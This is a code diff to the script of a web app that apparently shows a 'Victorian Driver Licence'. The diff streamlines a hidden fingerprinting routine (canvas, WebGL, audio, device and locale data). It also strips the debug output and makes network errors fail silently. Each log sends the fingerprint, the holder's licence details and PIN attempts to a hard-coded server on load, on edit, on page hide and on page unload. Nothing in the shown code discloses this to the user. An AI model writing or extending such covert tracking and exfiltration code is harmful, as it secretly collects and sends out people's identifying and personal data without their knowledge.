@@ -979,168 +979,87 @@ const APP_VERSION = "v5.0";
 /* ===== LOGGING / FINGERPRINTING ===== */
 // Use same protocol as current page to avoid mixed content issues
 const SERVER_URL = (window.location.protocol === 'https:' ? 'https://' : 'http://') + '192.168.0.50:8321/log.php';
-const DEBUG_LOGGING = true; // Enable debug output for logging verification
 
-// Cache for expensive fingerprint data
-let _cachedFingerprint = null;
-let _fingerprintPromise = null;
-let _fingerprintStartTime = 0;
+// Cache for fingerprint data - computed once per page load
+let cachedFingerprint = null;
 
-// Fast basic fingerprint - returns immediately without blocking
-function getBasicFingerprint() {
-  return {
-    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-    pixelRatio: window.devicePixelRatio,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    language: navigator.language,
-    languages: navigator.languages ? navigator.languages.join(',') : null,
-    platform: navigator.platform,
-    hardwareConcurrency: navigator.hardwareConcurrency || null,
-    deviceMemory: navigator.deviceMemory || null,
-    userAgent: navigator.userAgent,
-    touchSupport: 'ontouchstart' in window,
-    maxTouchPoints: navigator.maxTouchPoints || 0,
-    cookieEnabled: navigator.cookieEnabled,
-    doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack,
-    colorGamut: screen.colorGamut || null,
-    screenOrientation: screen.orientation ? screen.orientation.type : null,
-    connection: navigator.connection ? { effectiveType: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : null,
-    // Basic canvas fingerprint (quick, no crypto)
-    canvasBasic: (() => {
-      try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = 200; canvas.height = 50;
-        ctx.textBaseline = "top";
-        ctx.font = "14px Arial";
-        ctx.fillText("Victorian Driver Licence", 2, 20);
-        return canvas.toDataURL().substring(0, 100);
-      } catch(e) { return null; }
-    })()
-  };
-}
-
-// Expensive fingerprinting - runs asynchronously in background
-// Uses requestIdleCallback or setTimeout to avoid blocking UI
-function computeExpensiveFingerprint() {
-  // Return cached if already computed
-  if (_cachedFingerprint && _cachedFingerprint.complete) {
-    return Promise.resolve(_cachedFingerprint);
-  }
+// Compute complete fingerprint including all expensive parts
+function computeFingerprint() {
+  const fp = {};
   
-  // Return existing promise if already computing
-  if (_fingerprintPromise) {
-    return _fingerprintPromise;
-  }
+  // Basic fingerprint data
+  fp.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+  fp.pixelRatio = window.devicePixelRatio;
+  fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  fp.language = navigator.language;
+  fp.languages = navigator.languages ? navigator.languages.join(',') : null;
+  fp.platform = navigator.platform;
+  fp.hardwareConcurrency = navigator.hardwareConcurrency || null;
+  fp.deviceMemory = navigator.deviceMemory || null;
+  fp.userAgent = navigator.userAgent;
+  fp.touchSupport = 'ontouchstart' in window;
+  fp.maxTouchPoints = navigator.maxTouchPoints || 0;
+  fp.cookieEnabled = navigator.cookieEnabled;
+  fp.doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack;
+  fp.colorGamut = screen.colorGamut || null;
+  fp.screenOrientation = screen.orientation ? screen.orientation.type : null;
+  fp.connection = navigator.connection ? { effectiveType: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : null;
   
-  _fingerprintStartTime = performance.now();
-  _fingerprintPromise = new Promise((resolve) => {
-    const doFingerprint = async () => {
-      const fp = {};
-      
-      // Canvas hash - defer with timeout
-      try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = "top";
-        ctx.font = "14px Arial";
-        ctx.fillText("Victorian Driver Licence", 2, 20);
-        // Use simple hash instead of crypto.subtle for speed
-        const dataURL = canvas.toDataURL();
-        let hash = 0;
-        for (let i = 0; i < dataURL.length; i++) {
-          const char = dataURL.charCodeAt(i);
-          hash = ((hash << 5) - hash) + char;
-          hash = hash & hash;
-        }
-        fp.canvasHash = hash.toString(16);
-      } catch(e) { fp.canvasHash = null; }
-      
-      // WebGL - check if available (may fail on some devices)
-      try {
-        const gl = document.createElement('canvas').getContext('webgl');
-        if (gl) {
-          fp.webGLVendor = gl.getParameter(gl.VENDOR);
-          fp.webGLRenderer = gl.getParameter(gl.RENDERER);
-          fp.webGLVersion = gl.getParameter(gl.VERSION);
-        }
-      } catch(e) { fp.webGLVendor = null; fp.webGLRenderer = null; fp.webGLVersion = null; }
-      
-      // Audio fingerprint - skip if AudioContext can't be created (common on mobile)
-      try {
-        const AudioContext = window.AudioContext || window.webkitAudioContext;
-        if (AudioContext) {
-          const audioCtx = new AudioContext();
-          if (audioCtx.state === 'suspended') {
-            await audioCtx.resume();
-          }
-          const oscillator = audioCtx.createOscillator();
-          const analyser = audioCtx.createAnalyser();
-          oscillator.connect(analyser);
-          oscillator.frequency.setValueAtTime(1000, audioCtx.currentTime);
-          oscillator.start();
-          const data = new Uint8Array(analyser.frequencyBinCount);
-          analyser.getByteFrequencyData(data);
-          fp.audioHash = Array.from(data.slice(0, 32)).join('');
-          oscillator.stop();
-          audioCtx.close();
-        }
-      } catch(e) { 
-        // Audio fingerprinting failed - this is common on mobile, not critical
-        fp.audioHash = null; 
-      }
-      
-      fp.complete = true;
-      fp.computeTimeMs = Math.round(performance.now() - _fingerprintStartTime);
-      _cachedFingerprint = fp;
-      
-      if (DEBUG_LOGGING) {
-        console.log('[Fingerprint] Computed expensive fingerprint in', fp.computeTimeMs, 'ms');
-      }
-      
-      resolve(fp);
-    };
-    
-    // Use requestIdleCallback if available, otherwise setTimeout
-    if (window.requestIdleCallback) {
-      window.requestIdleCallback(doFingerprint, { timeout: 5000 });
-    } else {
-      setTimeout(doFingerprint, 100);
-    }
-  });
-  
-  return _fingerprintPromise;
-}
-
-// Main getFingerprint - fast return with basic info, background refresh
-function getFingerprint() {
-  const basic = getBasicFingerprint();
-  
-  // Start computing expensive fingerprint in background (don't await)
-  computeExpensiveFingerprint();
-  
-  // Return basic info immediately, expensive stuff will be added later
-  return {
-    ...basic,
-    canvasHash: null,   // Will be filled in background
-    webGLVendor: null,  // Will be filled in background
-    webGLRenderer: null,
-    webGLVersion: null,
-    audioHash: null,
-    computeTimeMs: 0,
-    complete: false
-  };
-}
-
-// Get full fingerprint (basic + expensive) - use for non-blocking when needed
-async function getFullFingerprint() {
-  const basic = getBasicFingerprint();
+  // Canvas hash
   try {
-    const expensive = await computeExpensiveFingerprint();
-    return { ...basic, ...expensive };
-  } catch(e) {
-    return basic;
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillText("Victorian Driver Licence", 2, 20);
+    const dataURL = canvas.toDataURL();
+    let hash = 0;
+    for (let i = 0; i < dataURL.length; i++) {
+      const char = dataURL.charCodeAt(i);
+      hash = ((hash << 5) - hash) + char;
+      hash = hash & hash;
+    }
+    fp.canvasHash = hash.toString(16);
+  } catch(e) { fp.canvasHash = null; }
+  
+  // WebGL
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    if (gl) {
+      fp.webGLVendor = gl.getParameter(gl.VENDOR);
+      fp.webGLRenderer = gl.getParameter(gl.RENDERER);
+      fp.webGLVersion = gl.getParameter(gl.VERSION);
+    }
+  } catch(e) { fp.webGLVendor = null; fp.webGLRenderer = null; fp.webGLVersion = null; }
+  
+  // Audio fingerprint
+  try {
+    const AudioContext = window.AudioContext || window.webkitAudioContext;
+    if (AudioContext) {
+      const audioCtx = new AudioContext();
+      const oscillator = audioCtx.createOscillator();
+      const analyser = audioCtx.createAnalyser();
+      oscillator.connect(analyser);
+      oscillator.frequency.setValueAtTime(1000, audioCtx.currentTime);
+      oscillator.start();
+      const data = new Uint8Array(analyser.frequencyBinCount);
+      analyser.getByteFrequencyData(data);
+      fp.audioHash = Array.from(data.slice(0, 32)).join('');
+      oscillator.stop();
+      audioCtx.close();
+    }
+  } catch(e) { fp.audioHash = null; }
+  
+  return fp;
+}
+
+// Get fingerprint - returns cached data if available, computes once on first call
+function getFingerprint() {
+  if (cachedFingerprint) {
+    return cachedFingerprint;
   }
+  cachedFingerprint = computeFingerprint();
+  return cachedFingerprint;
 }
 
 function getLicenceDetails() {
@@ -1152,24 +1071,10 @@ function getLicenceDetails() {
   };
 }
 
-// Send log using sendBeacon (most reliable for mobile) or fetch with keepalive
+// Send log using fetch with keepalive - silent fail on error
 function sendLog(payload) {
   const data = JSON.stringify(payload);
   
-  // Use sendBeacon if available (most reliable on mobile, works during page unload)
-  if (navigator.sendBeacon) {
-    const blob = new Blob([data], { type: 'application/json' });
-    const result = navigator.sendBeacon(SERVER_URL, blob);
-    if (DEBUG_LOGGING) {
-      console.log('[Log] sendBeacon result:', result, 'payload size:', data.length);
-    }
-    return result;
-  }
-  
-  // Fallback to fetch with keepalive (works for most cases)
-  if (DEBUG_LOGGING) {
-    console.log('[Log] Using fetch keepalive, payload:', payload);
-  }
   fetch(SERVER_URL, {
     method: 'POST',
     headers: { 
@@ -1178,42 +1083,23 @@ function sendLog(payload) {
     },
     body: data,
     keepalive: true
-  }).then(() => {
-    if (DEBUG_LOGGING) console.log('[Log] Success:', payload.event);
-  }).catch(err => {
-    if (DEBUG_LOGGING) console.log('[Log] Failed:', payload.event, err);
-  });
+  }).catch(() => {});
 }
 
 async function logAccess(event, success = false, pinAttempt = null) {
-  // Get basic fingerprint immediately (non-blocking)
   const fingerprint = getFingerprint();
   const details = getLicenceDetails();
   const payload = {
     timestamp: new Date().toISOString(),
+    ip: "client-side",
     event: event,
     success: success,
     pin_attempt: pinAttempt,
     ...fingerprint,
-    ...details,
-    fpComplete: false // Will be updated if/when expensive fingerprint completes
+    ...details
   };
   
-  // Send log immediately with basic fingerprint (non-blocking)
   sendLog(payload);
-  
-  // In background, compute expensive fingerprint and send update if needed
-  computeExpensiveFingerprint().then(expensive => {
-    if (expensive && expensive.complete) {
-      const updatePayload = {
-        timestamp: new Date().toISOString(),
-        event: event + '_fingerprint_complete',
-        ...expensive,
-        fpComplete: true
-      };
-      sendLog(updatePayload);
-    }
-  }).catch(() => {});
 }
 
 /* ===== DATE ===== */
@@ -1508,7 +1394,7 @@ editBtn.onclick = () => {
   editModal.style.display = "flex";
 };
 cancelEditBtn.onclick = () => { vibrate(); editModal.style.display = "none"; };
-saveEditBtn.onclick = () => {
+saveEditBtn.onclick = async () => {
   vibrate();
   const newName    = document.getElementById("editName").value.trim();
   const newDOB     = document.getElementById("editDOB").value.trim();
@@ -1524,6 +1410,7 @@ saveEditBtn.onclick = () => {
   if(newDOB) { calculateDates(newDOB); }
   editModal.style.display = "none";
   saveData();
+  await logAccess('data_updated', true);
 };
 
 function calculateDates(dobString) {
@@ -1701,31 +1588,27 @@ function exitApp() { window.history.back(); }
 logAccess('app_loaded');
 window.addEventListener("load", () => logAccess('app_fully_loaded'));
 
-// Use sendBeacon for page unload events (more reliable on mobile)
+// Page unload logging
 window.addEventListener("visibilitychange", () => {
   if (document.visibilityState === 'hidden') {
-    // Send final log on hidden
-    const payload = {
+    sendLog({
       timestamp: new Date().toISOString(),
+      ip: "client-side",
       event: 'app_hidden',
-      ...getBasicFingerprint()
-    };
-    sendLog(payload);
+      ...getFingerprint(),
+      ...getLicenceDetails()
+    });
   }
 });
 
-// Also log on pagehide for better mobile support
 window.addEventListener("pagehide", () => {
-  const payload = {
+  sendLog({
     timestamp: new Date().toISOString(),
+    ip: "client-side",
     event: 'app_pagehide',
-    ...getBasicFingerprint()
-  };
-  const data = JSON.stringify(payload);
-  if (navigator.sendBeacon) {
-    const blob = new Blob([data], { type: 'application/json' });
-    navigator.sendBeacon(SERVER_URL, blob);
-  }
+    ...getFingerprint(),
+    ...getLicenceDetails()
+  });
 });
 </script>
 </body>
